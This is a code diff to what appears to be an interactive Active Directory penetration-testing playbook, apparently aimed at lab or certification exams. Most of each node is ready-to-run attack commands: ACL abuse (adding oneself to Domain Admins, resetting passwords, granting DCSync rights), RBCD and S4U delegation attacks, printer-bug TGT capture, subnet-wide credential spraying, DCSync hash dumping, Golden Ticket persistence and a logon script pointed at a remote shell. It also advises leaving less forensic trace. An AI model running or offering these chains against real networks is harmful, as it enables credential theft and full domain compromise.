+# Or: set a SPN on the account → Kerberoast it
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
+impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP -request -outputfile tgs.txt
+
+# ── GENERICALL OVER A GROUP ───────────────
+# Add yourself directly to the group (e.g., Domain Admins)
+Add-DomainGroupMember -Identity 'Domain Admins' -Members $USER
+# Verify:
+Get-DomainGroupMember 'Domain Admins' | select MemberName
+
+# ── GENERICALL OVER A COMPUTER ────────────
+# Resource-Based Constrained Delegation (RBCD) attack:
+# 1. Create a fake computer account you control
+impacket-addcomputer $DOMAIN/$USER:'$PASS' -computer-name 'FAKE$' -computer-pass 'FakePass123!' -dc-ip $DC_IP
+# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity on the target
+Set-DomainRBCD -Identity TARGET_COMPUTER -DelegateFrom FAKE$ -Verbose
+# 3. Get a ticket impersonating administrator
+impacket-getST $DOMAIN/FAKE$:'FakePass123!' -spn cifs/TARGET.domain.com -impersonate administrator -dc-ip $DC_IP
+export KRB5CCNAME=administrator.ccache
+impacket-secretsdump -k -no-pass administrator@TARGET.domain.com
+
+# ── GENERICWRITE OVER A USER ──────────────
+# Cannot reset password — can write specific attributes
+# Option 1: Set SPN → Kerberoast
+Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}
+impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP -request -outputfile tgs.txt
+
+# Option 2: Set logon script → code execution when user logs in
+Set-DomainObject -Identity targetuser -Set @{scriptpath='\\$LHOST\share\shell.bat'}
+
+# ── WRITEDACL OVER DOMAIN/OBJECT ──────────
+# Grant yourself DCSync rights over the domain
 Add-DomainObjectAcl \\
-  -TargetIdentity "DC=domain,DC=com" \\
-  -PrincipalIdentity youruser \\
-  -Rights DCSync
+  -TargetIdentity "DC=$DOMAIN_DC,DC=$DOMAIN_TLD" \\
+  -PrincipalIdentity $USER \\
+  -Rights DCSync -Verbose
+# Then run DCSync from Kali:
+impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP -just-dc-ntlm
 
-# ForceChangePassword
-$cred = New-Object System.Net.NetworkCredential("","NewPass123!")
-Set-DomainUserPassword -Identity target -AccountPassword $cred.SecurePassword
+# ── WRITEOWNER ────────────────────────────
+# Take ownership of object → then grant yourself GenericAll
+Set-DomainObjectOwner -Identity targetuser -OwnerIdentity $USER
+Add-DomainObjectAcl -TargetIdentity targetuser -PrincipalIdentity $USER -Rights All
 
-# DCSync once you have rights
-.\\mimikatz.exe "privilege::debug" \\
-  "lsadump::dcsync /domain:domain.com /user:administrator" "exit"`,
-    warn: null,
+# ── FORCECHANGEPASSWORD ───────────────────
+# Reset target's password without knowing current password
+$pass = ConvertTo-SecureString 'NewPass!123' -AsPlainText -Force
+Set-DomainUserPassword -Identity targetuser -AccountPassword $pass
+# From Kali (no Windows needed):
+impacket-rpcclient $DOMAIN/$USER:'$PASS'@$DC_IP
+rpcclient> setuserinfo2 targetuser 23 'NewPass!123'
+
+# ── FROM KALI (impacket — no Windows needed) ──
+# GenericAll/ForceChangePassword via rpcclient:
+impacket-rpcclient -U "$DOMAIN/$USER%$PASS" $DC_IP -c "setuserinfo2 targetuser 23 'NewPass!123'"
+
+# WriteDACL via impacket:
+impacket-dacledit -action write -rights DCSync \\
+  -principal $USER \\
+  -target-dn "DC=$DOMAIN_DC,DC=$DOMAIN_TLD" \\
+  "$DOMAIN/$USER:$PASS" -dc-ip $DC_IP`,
+    warn: "Always verify your ACL edge in BloodHound before acting — GenericAll on a group vs GenericAll on a user are completely different exploits. From Kali, impacket-dacledit and impacket-rpcclient handle most ACL abuses without needing a Windows foothold. After adding yourself to Domain Admins, wait 5-10 minutes for replication or re-authenticate to get the updated token — your current session won't reflect the group change immediately.",
     choices: [
-      { label: "Got DA hash via DCSync", next: "dcsync" },
-      { label: "Added self to Domain Admins — lateral move", next: "lateral_movement" },
+      { label: "Added to Domain Admins — lateral move to DC", next: "lateral_movement" },
+      { label: "WriteDACL — granted DCSync rights", next: "dcsync" },
+      { label: "Password reset on high-value user", next: "creds_found" },
+      { label: "Kerberoasted via GenericWrite SPN", next: "kerberoast" },
+      { label: "RBCD attack on computer — got SYSTEM", next: "lateral_movement" },
     ],
   },
 
   delegation: {
     phase: "AD",
     title: "Delegation Attacks",
-    body: "Unconstrained delegation captures TGTs. Constrained delegation allows S4U impersonation. Both can reach Domain Admin.",
-    cmd: `# Find unconstrained delegation
-Get-DomainComputer -Unconstrained | select name
-Get-DomainUser -AllowDelegation -AdminCount | select name
+    body: "Delegation lets services act on behalf of users. Two types with completely different attack paths. Unconstrained: the machine stores full TGTs — if you compromise it, you steal tickets for any user who authenticates to it, including Domain Admins. Constrained: the account can impersonate any user to a specific service — exploited via S4U2Self/S4U2Proxy to get a ticket as Administrator. Resource-Based Constrained Delegation (RBCD) is the modern variant, triggered by GenericAll/GenericWrite over a computer object.",
+    cmd: `# ── FIND DELEGATION TARGETS ──────────────
+# Unconstrained delegation computers (highest value):
+Get-DomainComputer -Unconstrained | select name,dnshostname
+# Any computer here (excluding DCs) = attack target
+# If you compromise it → steal TGTs of any DA that connects
 
-# Find constrained delegation
+# Unconstrained delegation users:
+Get-DomainUser -AllowDelegation -AdminCount | select samaccountname
+
+# Constrained delegation (specific SPNs):
 Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
 Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
 
-# S4U2Self + S4U2Proxy (Rubeus — no MSF)
-.\\Rubeus.exe s4u \\
-  /user:svcaccount \\
-  /rc4:NTLM_HASH \\
-  /impersonateuser:administrator \\
-  /msdsspn:"CIFS/dc01.domain.com" \\
-  /ptt
+# From Kali:
+impacket-findDelegation $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP
 
-# Verify ticket loaded
-.\\Rubeus.exe klist`,
-    warn: null,
+# ── UNCONSTRAINED DELEGATION ATTACK ──────
+# Prerequisite: you have SYSTEM on the unconstrained delegation machine
+# Step 1: Monitor for TGTs hitting this machine
+.\Rubeus.exe monitor /interval:5 /nowrap
+# Step 2: Trigger a DA to connect (e.g., printer bug / SpoolSample)
+.\SpoolSample.exe $DC_FQDN $UNCONSTRAINED_HOST_FQDN
+# Step 3: Rubeus captures the TGT — base64 blob appears in monitor output
+# Step 4: Import the ticket
+.\Rubeus.exe ptt /ticket:BASE64_BLOB
+# Step 5: Verify + use
+.\Rubeus.exe klist
+dir \\$DC_FQDN\C$    # test DA access
+
+# ── CONSTRAINED DELEGATION — S4U ATTACK ──
+# You control an account with constrained delegation configured
+# Impersonate Administrator to the allowed service
+
+# From Windows (Rubeus):
+.\Rubeus.exe s4u \\
+  /user:svc_delegated \\
+  /rc4:$NTLM_HASH \\
+  /impersonateuser:administrator \\
+  /msdsspn:"CIFS/dc01.$DOMAIN" \\
+  /ptt
+# Verify:
+.\Rubeus.exe klist
+dir \\dc01.$DOMAIN\C$
+
+# From Kali (impacket):
+impacket-getST \\
+  -spn CIFS/dc01.$DOMAIN \\
+  -impersonate administrator \\
+  $DOMAIN/svc_delegated -hashes :$NTLM_HASH -dc-ip $DC_IP
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass administrator@dc01.$DOMAIN
+
+# ── RBCD — RESOURCE-BASED CONSTRAINED DELEGATION ──
+# Prerequisite: GenericAll or GenericWrite over a computer object
+# (BloodHound will show this edge)
+
+# Step 1: Create a fake computer account you control
+impacket-addcomputer $DOMAIN/$USER:'$PASS' \\
+  -computer-name 'ATTACKER$' \\
+  -computer-pass 'AttackerPass123!' \\
+  -dc-ip $DC_IP
+
+# Step 2: Set msDS-AllowedToActOnBehalfOfOtherIdentity on target
+# (from Windows with PowerView):
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor \\
+  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-XXXX-YYYY-ZZZZ-ATTACKER_RID)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Set-DomainRawObject TARGET_COMPUTER \\
+  -Properties @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+# Or from Kali (impacket-rbcd):
+impacket-rbcd -action write \\
+  -delegate-from 'ATTACKER$' \\
+  -delegate-to 'TARGET_COMPUTER$' \\
+  $DOMAIN/$USER:'$PASS' -dc-ip $DC_IP
+
+# Step 3: Get ST impersonating administrator
+impacket-getST \\
+  -spn cifs/TARGET.$DOMAIN \\
+  -impersonate administrator \\
+  $DOMAIN/'ATTACKER$':'AttackerPass123!' -dc-ip $DC_IP
+export KRB5CCNAME=administrator.ccache
+impacket-secretsdump -k -no-pass administrator@TARGET.$DOMAIN`,
+    warn: "Unconstrained delegation requires you to actually compromise the machine first — it's not a remote attack. The printer bug (SpoolSample) forces a DC to authenticate to your compromised machine, capturing the DC machine account TGT. With that you can perform a DCSync equivalent. RBCD is the most reliable constrained delegation attack from Kali since it only needs impacket and a writable computer object — no Windows foothold required.",
     choices: [
-      { label: "Ticket loaded — lateral move to DC", next: "lateral_movement" },
+      { label: "Unconstrained — captured DA TGT", next: "dcsync" },
+      { label: "Constrained S4U — ticket as administrator", next: "lateral_movement" },
+      { label: "RBCD — secretsdump on target", next: "dcsync" },
     ],
   },
 
   lateral_movement: {
     phase: "AD",
-    title: "Lateral Movement",
-    body: "Move between machines with creds, hashes, or Kerberos tickets. impacket suite covers everything — no MSF console needed.",
-    cmd: `# evil-winrm (WinRM 5985/5986)
-evil-winrm -i $TARGET -u admin -p 'pass'
-evil-winrm -i $TARGET -u admin -H NTLM_HASH
+    title: "Lateral Movement — Move Between Machines",
+    body: "You have credentials, a hash, or a ticket — now move. Tool choice depends on what ports are open and what rights you have. evil-winrm is the cleanest for WinRM (5985). psexec gives a SYSTEM shell but writes a service — noisier. wmiexec is stealthier (no service, no disk write). Always verify creds with CME before attempting a connection — it saves time. Pass-the-hash works with NTLM; pass-the-ticket works with Kerberos.",
+    cmd: `# ── STEP 0: VERIFY CREDS FIRST ───────────
+# Know what you're getting before connecting
+crackmapexec smb $TARGET -u $USER -p '$PASS'
+crackmapexec smb $TARGET -u $USER -H $NTLM_HASH
+# [+] = valid creds    (Pwn3d!) = local admin → can get shell
 
-# psexec (requires admin + file write to ADMIN$)
-impacket-psexec domain/admin:'pass'@$TARGET
-impacket-psexec domain/admin@$TARGET -hashes :NTLM_HASH
+crackmapexec winrm $TARGET -u $USER -p '$PASS'
+# [+] = WinRM open and creds valid → evil-winrm will work
 
-# wmiexec (stealthier — no service creation)
-impacket-wmiexec domain/admin:'pass'@$TARGET
+# ── EVIL-WINRM — WinRM (port 5985/5986) ──
+# Best shell for Windows — tab completion, file upload/download
+evil-winrm -i $TARGET -u $USER -p '$PASS'
+evil-winrm -i $TARGET -u $USER -H $NTLM_HASH     # pass-the-hash
+evil-winrm -i $TARGET -u $USER -p '$PASS' -S      # HTTPS (5986)
 
-# smbexec
-impacket-smbexec domain/admin:'pass'@$TARGET
+# Upload/download inside evil-winrm:
+# upload /path/to/local/tool.exe C:\Windows\Temp\tool.exe
+# download C:\Windows\Temp\output.txt /local/path/
 
-# Pass-the-ticket
-export KRB5CCNAME=ticket.ccache
-impacket-psexec -k -no-pass domain/admin@dc01.domain.com
+# ── IMPACKET-PSEXEC — SMB (port 445) ──────
+# Gives SYSTEM shell. Requires admin rights + write to ADMIN$
+# Creates a service — detectable, noisier
+impacket-psexec $DOMAIN/$USER:'$PASS'@$TARGET
+impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH
 
-# PowerShell remoting
-Enter-PSSession -ComputerName $TARGET -Credential domain\\admin`,
-    warn: null,
+# ── IMPACKET-WMIEXEC — WMI (port 135/445) ─
+# Stealthier — no service created, output via SMB share
+# Semi-interactive shell
+impacket-wmiexec $DOMAIN/$USER:'$PASS'@$TARGET
+impacket-wmiexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH
+
+# ── IMPACKET-SMBEXEC — SMB ────────────────
+# No binary written — uses cmd.exe via service
+impacket-smbexec $DOMAIN/$USER:'$PASS'@$TARGET
+impacket-smbexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH
+
+# ── PASS-THE-TICKET — Kerberos ────────────
+# Use a Kerberos ticket (.ccache) instead of creds/hash
+export KRB5CCNAME=/path/to/ticket.ccache
+impacket-psexec -k -no-pass $DOMAIN/$USER@dc01.$DOMAIN
+impacket-wmiexec -k -no-pass $DOMAIN/$USER@$TARGET
+
+# Generate ticket from hash (overpass-the-hash):
+impacket-getTGT $DOMAIN/$USER -hashes :$NTLM_HASH -dc-ip $DC_IP
+export KRB5CCNAME=$USER.ccache
+
+# ── CRACKMAPEXEC — SPRAY ALL MACHINES ─────
+# Find where creds work across the whole domain
+crackmapexec smb $SUBNET/24 -u $USER -p '$PASS' --continue-on-success
+crackmapexec smb $SUBNET/24 -u $USER -H $NTLM_HASH --continue-on-success
+# (Pwn3d!) machines = you have local admin → shell via psexec/wmiexec
+
+# Run commands across all (Pwn3d!) machines:
+crackmapexec smb $SUBNET/24 -u $USER -H $NTLM_HASH -x "whoami"
+
+# ── XFREERDP — RDP (if needed) ────────────
+xfreerdp /u:$USER /p:'$PASS' /v:$TARGET /cert-ignore +clipboard
+xfreerdp /u:$USER /pth:$NTLM_HASH /v:$TARGET /cert-ignore    # PtH (restricted admin mode)
+
+# ── POWERSHELL REMOTING ────────────────────
+# From a Windows foothold:
+$cred = Get-Credential    # or build manually
+Enter-PSSession -ComputerName $TARGET -Credential $DOMAIN\$USER
+Invoke-Command -ComputerName $TARGET -ScriptBlock {whoami} -Credential $DOMAIN\$USER`,
+    warn: "WinRM (5985) is open on most AD machines by default — always try evil-winrm first. psexec requires the ADMIN$ share to be accessible — if it fails with 'STATUS_ACCESS_DENIED' but CME shows (Pwn3d!), try wmiexec instead. Pass-the-hash via RDP requires restricted admin mode enabled on the target — not always available. Always spray CME across the full subnet after getting new creds — (Pwn3d!) on multiple machines means lateral movement options.",
     choices: [
-      { label: "On DC — DCSync everything", next: "dcsync" },
-      { label: "On member server — privesc further", next: "windows_post_exploit" },
+      { label: "Reached DC — run DCSync", next: "dcsync" },
+      { label: "On member server — privesc to SYSTEM", next: "windows_post_exploit" },
+      { label: "Spray found more machines — enumerate", next: "windows_post_exploit" },
+      { label: "Need tickets — Kerberoast/AS-REP first", next: "kerberoast" },
     ],
   },
 
   dcsync: {
     phase: "AD",
-    title: "DCSync — Domain Owned",
-    body: "DCSync dumps all domain hashes. You have replication rights — pull every account. This is game over for the domain.",
-    cmd: `# Mimikatz DCSync (on Windows — no MSF)
-.\\mimikatz.exe "privilege::debug" \\
-  "lsadump::dcsync /domain:domain.com /user:administrator" \\
-  "exit"
+    title: "DCSync — Dump the Domain",
+    body: "DCSync simulates a Domain Controller replication request — any account with Replicating Directory Changes + Replicating Directory Changes All rights can pull password hashes for any account without touching LSASS. This is game over: you get every user's NTLM hash, crack offline or pass-the-hash directly to any machine in the domain. Prefer impacket-secretsdump from Kali — it needs no agent on the DC and leaves less forensic trace than mimikatz.",
+    cmd: `# ── FROM KALI — impacket-secretsdump ────
+# (preferred — no agent, no AV risk, works remotely)
 
-# Dump all hashes
-.\\mimikatz.exe "privilege::debug" \\
-  "lsadump::dcsync /domain:domain.com /all /csv" \\
-  "exit"
+# With cleartext creds:
+impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP
 
-# impacket-secretsdump (from Kali — no agent)
-impacket-secretsdump domain/admin:'pass'@$DCIP
-impacket-secretsdump domain/admin@$DCIP -hashes :NTLM_HASH
-impacket-secretsdump domain/admin:'pass'@$DCIP -just-dc-ntlm
+# With NTLM hash (pass-the-hash):
+impacket-secretsdump $DOMAIN/$USER@$DC_IP -hashes :NTLM_HASH
 
-# PTH to DC as Administrator
-evil-winrm -i $DCIP -u administrator -H <NTLM_HASH>`,
-    warn: null,
+# Just NTLM hashes (fastest, no Kerberos tickets):
+impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP -just-dc-ntlm
+
+# Dump only specific account (quieter):
+impacket-secretsdump $DOMAIN/$USER:'$PASS'@$DC_IP -just-dc-user administrator
+
+# Output format — read the results:
+# Administrator:500:LM_HASH:NTLM_HASH:::
+# username:RID:LM:NTLM:::
+# The NTLM field (after the second colon) is what you use
+
+# ── FROM WINDOWS — mimikatz ───────────────
+# (requires DA or DCSync rights + debug privilege)
+.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /user:administrator" "exit"
+
+# Dump all accounts:
+.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /all /csv" "exit"
+
+# ── USE THE HASHES ────────────────────────
+# Immediate goals after DCSync:
+# 1. Get DA shell on DC
+evil-winrm -i $DC_IP -u administrator -H NTLM_HASH
+impacket-psexec $DOMAIN/administrator@$DC_IP -hashes :NTLM_HASH
+
+# 2. Lateral movement to all machines (Pwn3d! = local admin)
+crackmapexec smb $SUBNET/24 -u administrator -H NTLM_HASH
+
+# 3. Crack offline for cleartext (useful for persistence + report)
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# 4. Golden Ticket (persistence — survives password change)
+# Need: krbtgt NTLM hash, domain SID
+impacket-lookupsid $DOMAIN/$USER:'$PASS'@$DC_IP | grep "Domain SID"
+impacket-ticketer -nthash KRBTGT_NTLM -domain-sid S-1-5-21-XXXX -domain $DOMAIN administrator
+export KRB5CCNAME=administrator.ccache
+impacket-psexec -k -no-pass $DOMAIN/administrator@dc01.$DOMAIN
+
+# ── GRAB THE PROOF ────────────────────────
+evil-winrm -i $DC_IP -u administrator -H NTLM_HASH
+# Once in:
+whoami && hostname && ipconfig
+type C:\Users\Administrator\Desktop\proof.txt`,
+    warn: "impacket-secretsdump output includes machine account hashes (ending in $) — ignore these for cracking, focus on user accounts. The krbtgt hash enables Golden Ticket attacks for long-term persistence — always grab it even if you don't use it immediately. If secretsdump fails with 'STATUS_USER_SESSION_DELETED', the DC rejected the replication request — verify your account actually has DCSync rights (BloodHound → Find Principals with DCSync Rights).",
     choices: [
-      { label: "Domain Admin shell on DC — grab proof", next: "ad_complete" },
+      { label: "Got DA shell — grab proof.txt", next: "ad_complete" },
+      { label: "Hash cracking — cleartext for report", next: "hashcrack" },
+      { label: "Lateral movement across domain", next: "lateral_movement" },
     ],
   },
 
